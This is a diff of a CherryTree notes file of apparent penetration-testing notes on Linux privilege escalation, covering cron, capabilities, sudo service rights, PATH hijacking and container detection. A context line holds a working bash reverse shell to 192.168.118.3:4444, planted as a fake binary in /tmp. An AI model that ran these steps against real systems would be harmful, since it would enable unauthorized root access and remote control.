@@ -503,7 +503,7 @@ Check capabilities:
         <codebox char_offset="620" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">grep "CRON" /var/log/syslog</codebox>
         <codebox char_offset="720" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">getcap -r / 2&gt;/dev/null
 # And search for everyone</codebox>
-        <node name="Special Cases" unique_id="117" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690221496" ts_lastsave="1690222168">
+        <node name="Special Cases" unique_id="117" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690221496" ts_lastsave="1690222176">
           <rich_text>---------------------- Services and Reboot Privs ----------------------
 If we have these SUDO capabilities (sudo -l):
 
@@ -542,7 +542,8 @@ More on that here: </rich_text>
 export PATH=/tmp:$PATH
 # and add to that path a reverse shell with the name of that binary system call (called without absolute path)
 echo 'bash -c "bash -i &gt;&amp; /dev/tcp/192.168.118.3/4444 0&gt;&amp;1"' &gt; /tmp/{binary}
-chmod +x /tmp/{binary}</codebox>
+chmod +x /tmp/{binary}
+</codebox>
           <codebox char_offset="827" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hostname
 # If we get gibberish data like "f8e1a236869d", we are in a container and we should escape it =&gt; see services that are on the machine and we could exploit
 # (other services maybe be run by machine itself, not container, and we could gather info about those services from inside the container, to gain RCE
